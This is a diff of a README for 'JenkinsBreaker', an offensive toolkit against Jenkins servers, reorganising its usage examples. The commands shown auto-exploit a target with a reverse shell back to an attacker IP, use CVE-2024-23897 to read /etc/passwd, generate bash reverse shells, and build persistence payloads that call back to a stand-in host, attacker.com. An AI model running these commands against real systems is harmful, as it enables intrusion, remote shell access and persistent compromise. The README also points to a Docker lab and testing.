@@ -220,34 +220,47 @@ docker-compose down
 docker-compose down -v  # Remove volumes completely
 ```
 
-## Example Usage
+## Quick Start
 
-### Automatic Enumeration & Exploitation
+### Core Exploitation
 
 ```bash
+# Automatic enumeration and exploitation
 python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444
-```
 
-### Run Specific CVE Exploit
-
-```bash
-# CLI Arbitrary File Read
+# Run specific CVE exploit
 python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2024-23897 --target-file /etc/passwd
 
-# Script Security RCE
-python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2019-1003029
-```
-
-### Generate Reverse Shell
-
-```bash
+# Generate reverse shell
 python3 JenkinsBreaker.py --generate-shell bash --lhost YOUR_IP --lport 4444
+
+# List available exploits
+python3 JenkinsBreaker.py --list-cves
 ```
 
-### List Available Exploits
+### Advanced Modules
 
 ```bash
-python3 JenkinsBreaker.py --list-cves
+# Launch Textual TUI
+python3 launch_tui.py --url http://localhost:8080 --username admin --password admin
+
+# Launch Web UI (access at http://localhost:8000)
+python3 launch_webui.py
+
+# Run JenkinsFuzzer
+python3 jenkinsfuzzer.py --url http://localhost:8080 --username admin --password admin
+
+# Perform JWT analysis
+python3 jwt_breaker.py --url http://localhost:8080 --username admin --password admin
+
+# Fingerprint plugins and correlate CVEs
+python3 plugin_fingerprint.py --url http://localhost:8080 --username admin --password admin
+
+# Generate persistence payloads
+python3 persistence.py --url http://localhost:8080 --callback http://attacker.com/payload.sh
+
+# Run integration tests
+python3 test_integration.py
 ```
 
 ## WSL Testing
